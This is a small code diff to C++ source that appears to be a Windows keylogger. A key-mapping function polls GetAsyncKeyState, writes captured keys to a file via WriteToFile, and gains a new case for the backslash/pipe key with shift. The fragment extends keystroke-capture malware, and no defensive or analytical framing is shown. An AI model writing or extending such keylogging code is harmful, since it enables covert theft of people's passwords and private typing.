@@ -43,6 +43,7 @@
 #define VK_NUMPAD7 0x67;
 #define VK_NUMPAD8 0x68;
 #define VK_NUMPAD9 0x69;
+#define VK_OEM_5 0xDC;
 
 
 
@@ -110,7 +111,7 @@ bool Key_is_Listed(WORD iKey)
 		WriteToFile("9");
 		break;
 
-	
+
 
 	case 65:
 		if (GetAsyncKeyState(0xA0))
@@ -323,6 +324,10 @@ bool Key_is_Listed(WORD iKey)
 		}
 		break;
 
+	case 0xDC:
+		if (GetAsyncKeyState(0xA0))
+			std::cout << "|";
+		break;
 
 
 
